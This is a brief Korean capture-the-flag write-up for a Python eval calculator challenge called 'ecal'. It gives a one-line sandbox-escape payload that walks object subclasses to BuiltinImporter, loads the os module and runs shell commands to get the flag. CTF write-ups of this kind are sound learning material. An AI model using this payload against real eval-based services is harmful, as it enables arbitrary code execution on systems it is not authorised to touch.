# ecal

밑에처럼 계산기 기능의 코드임

![image](https://github.com/user-attachments/assets/409d9464-a533-4d0a-809b-8a6ea9b1a373)

밑에 미티게이션들이 있지만 있음

![image](https://github.com/user-attachments/assets/a5aa543b-fed1-4558-b9c2-61339f5a8731)

![image](https://github.com/user-attachments/assets/f0042b72-a6d5-4cfe-8088-1f6674774bfc)

모든 내장함수 막기 때문에 dir open이런방식이 아닌 ssti처럼 rce로 해야된다고 판단

![image](https://github.com/user-attachments/assets/05222d47-4823-4342-bd7c-b573387c0f43)

그러나 subprocess같은것들도 다 막혀서 방법 찾는도중 import를 해주는 attribute가 있음
[].__class__.__base__.__subclasses__()
으로 import해주는 애를 찾을 수 있는데
 [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os')
 이런식으로 os를 import해준 후, system으로 쉘실행시켜주면 플래그 획득

 ![image](https://github.com/user-attachments/assets/c5f5b0cc-bf61-490c-8d38-5b9a41717601)
